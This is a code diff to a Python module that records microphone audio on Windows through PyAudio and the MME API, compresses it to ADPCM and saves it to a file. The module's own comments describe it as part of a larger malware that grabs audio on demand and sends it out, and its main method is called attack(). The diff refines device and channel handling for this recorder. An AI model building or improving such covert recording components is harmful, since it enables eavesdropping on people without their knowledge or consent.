@@ -10,12 +10,10 @@ from os import path
 # Some restrictions:
 #   1) The module is intended to be used on a Windows machine with the default MME API.
 #   2) However, it is just a few lines of code away from working with Linux/Mac, thanks to the PyAudio library.
-#   3) The module is part of a bigger malware that invokes audio grabs on demand then sends them out.
-#   4) For the purpose of testing, an invoke of the module is included at the bottom of the file.
+#   3) The module is potentially a part of a bigger malware that invokes audio grabs on demand then sends them out.
 
 
 class Recorder:
-    CHANNELS = 2
     RATE = 44100
     ADPCM_OUTPUT_FILENAME = "output.adpcm"
 
@@ -25,6 +23,7 @@ class Recorder:
         self.audio = pyaudio.PyAudio()
         self.format = pyaudio.paInt32
         self.sample_size = self.audio.get_sample_size(self.format)
+        self.channels = 2
 
     def attack(self):
         self.assert_preconditions()
@@ -33,12 +32,16 @@ class Recorder:
         self.cleanup()
         return res
 
-    # Make sure the MME API is available
+    # Make sure the MME API and 1 input device are available
     def assert_preconditions(self):
-        for i in range(0, self.audio.get_host_api_count()):
-            if self.audio.get_host_api_info_by_index(i).get('name') == 'MME':
-                return
-        raise RuntimeError  # can't run on this machine
+        device = self.audio.get_default_input_device_info()
+        if self.get_host_api_name_of_device(device) == 'MME':
+            self.channels = min(device.get('maxInputChannels'), self.channels)
+        else:
+            raise RuntimeError("MME API not detected")
+
+    def get_host_api_name_of_device(self, device):
+        return self.audio.get_host_api_info_by_index(device['hostApi'])['name']
 
     def record(self):
         self.open_stream()
@@ -47,7 +50,7 @@ class Recorder:
         self.write(self.compress(frames))
 
     def open_stream(self):
-        self.stream = self.audio.open(format=self.format, channels=self.CHANNELS,
+        self.stream = self.audio.open(format=self.format, channels=self.channels,
                                       rate=self.RATE, input=True, frames_per_buffer=self.sample_size)
 
     def read_stream(self):
@@ -74,7 +77,7 @@ class Recorder:
     # Check if the file exists and whether it's in the correct size
     def assert_postconditions(self):
         try:
-            bytes_per_second = self.RATE * self.sample_size * self.CHANNELS / 8  # divided by 8 for compression
+            bytes_per_second = self.RATE * self.sample_size * self.channels / 8  # divided by 8 for compression
             return path.getsize(self.ADPCM_OUTPUT_FILENAME) >= bytes_per_second * self.duration
         except FileNotFoundError:
             return False
